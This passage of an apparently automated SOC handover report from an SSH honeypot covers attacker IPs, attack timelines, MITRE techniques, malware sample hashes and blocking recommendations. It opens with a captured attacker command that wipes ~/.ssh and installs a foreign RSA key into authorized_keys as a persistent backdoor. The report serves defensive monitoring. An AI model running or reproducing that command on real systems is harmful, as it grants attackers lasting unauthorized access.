| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:35:13` | `cowrie.session.connect` |
| `2026-04-09 18:35:13` | `cowrie.client.version` |
| `2026-04-09 18:35:13` | `cowrie.client.kex` |
| `2026-04-09 18:35:15` | `cowrie.login.success` |
| `2026-04-09 18:35:16` | `cowrie.session.params` |
| `2026-04-09 18:35:16` | `cowrie.command.input` |
| `2026-04-09 18:35:16` | `cowrie.command.failed` |
| `2026-04-09 18:35:16` | `cowrie.log.closed` |
| `2026-04-09 18:35:17` | `cowrie.session.params` |
| `2026-04-09 18:35:17` | `cowrie.command.input` |
| `2026-04-09 18:35:17` | `cowrie.session.file_download` |
| `2026-04-09 18:35:17` | `cowrie.log.closed` |
| `2026-04-09 18:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03aae849cb0

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-04-09 18:35 |
| **Last Seen** | 2026-04-09 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 18:35:22` | `cowrie.session.connect` |
| `2026-04-09 18:35:22` | `cowrie.client.version` |
| `2026-04-09 18:35:22` | `cowrie.client.kex` |
| `2026-04-09 18:35:24` | `cowrie.login.success` |
| `2026-04-09 18:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `189.50.142[.]78` | **25** | 2026-04-09 17:08 | 2026-04-09 18:38 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.210.61[.]208` | **25** | 2026-04-09 17:40 | 2026-04-09 18:17 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.231.192[.]36` | **24** | 2026-04-09 17:09 | 2026-04-09 18:23 | 1m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.133.99[.]235` | **10** | 2026-04-09 17:05 | 2026-04-09 17:21 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.81[.]215` | 1 | 2026-04-09 17:05 | 2026-04-09 17:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.178[.]142` | 1 | 2026-04-09 17:07 | 2026-04-09 17:07 | 6s | 0 | `T1592` | 🟢 LOW |
| `120.48.22[.]219` | 1 | 2026-04-09 17:48 | 2026-04-09 17:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.1.47[.]28` | 1 | 2026-04-09 17:41 | 2026-04-09 17:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.118[.]74` | 1 | 2026-04-09 17:06 | 2026-04-09 17:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.153.91[.]15` | 1 | 2026-04-09 17:43 | 2026-04-09 17:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.110.233[.]225` | 1 | 2026-04-09 17:45 | 2026-04-09 17:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.0.56[.]78` | 1 | 2026-04-09 17:07 | 2026-04-09 17:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.251.137[.]156` | 1 | 2026-04-09 17:54 | 2026-04-09 17:55 | 31s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-09 17:22 | 2026-04-09 17:23 | 57s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.48.178[.]142` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 7 |
| `120.48.22[.]219` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.118[.]74` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `189.50.142[.]78` | BR | SAMM TECNOLOGIA E TELECOMUNICACOES S.A | **100** ⚠️ | 48 |
| `49.251.137[.]156` | JP | J:COM WEST Co., Ltd. | **100** ⚠️ | 44 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `128.1.47[.]28` | US | UCLOUD | **100** ⚠️ | 50 |
| `180.153.91[.]15` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `35.210.61[.]208` | BE | Google LLC | **100** ⚠️ | 50 |
| `49.231.192[.]36` | TH | TCC1012 DON MUENG | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 158 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 84 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 32 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 32 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 163 cases |
| Tool 34  | Credential Extractor        | ✅ 151 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (2.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 65 priority case(s) shown individually · 14 recon entry/entries in table (4 group(s) consolidating 84 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T19:03:16Z_
